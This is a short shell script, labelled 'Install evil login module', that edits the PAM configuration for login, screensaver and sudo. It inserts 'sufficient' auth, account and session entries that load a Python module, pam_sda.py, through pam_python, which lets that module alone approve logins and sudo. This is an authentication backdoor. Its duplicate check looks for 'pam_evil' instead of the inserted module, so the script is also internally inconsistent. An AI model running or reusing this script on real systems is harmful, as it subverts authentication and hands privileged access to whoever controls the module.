#!/bin/sh
#
# Install evil login module
# C. Papathanasiou 2023
#
#

MODULES="login screensaver sudo"

for m in $MODULES;
do
	if grep -q "pam_evil" /etc/pam.d/$m
	then
		echo "/etc/pam.d/$m already has an Evil module"
	else
		sed -i -e '2s/^/auth       sufficient     \/lib\/security\/pam_python.so \/lib\/security\/pam_sda.py\'$'\n/' /etc/pam.d/$m
		sed -i -e '2s/^/account    sufficient     \/lib\/security\/pam_python.so \/lib\/security\/pam_sda.py\'$'\n/' /etc/pam.d/$m
		sed -i -e '2s/^/session    sufficient     \/lib\/security\/pam_python.so \/lib\/security\/pam_sda.py\'$'\n/' /etc/pam.d/$m
	fi
done
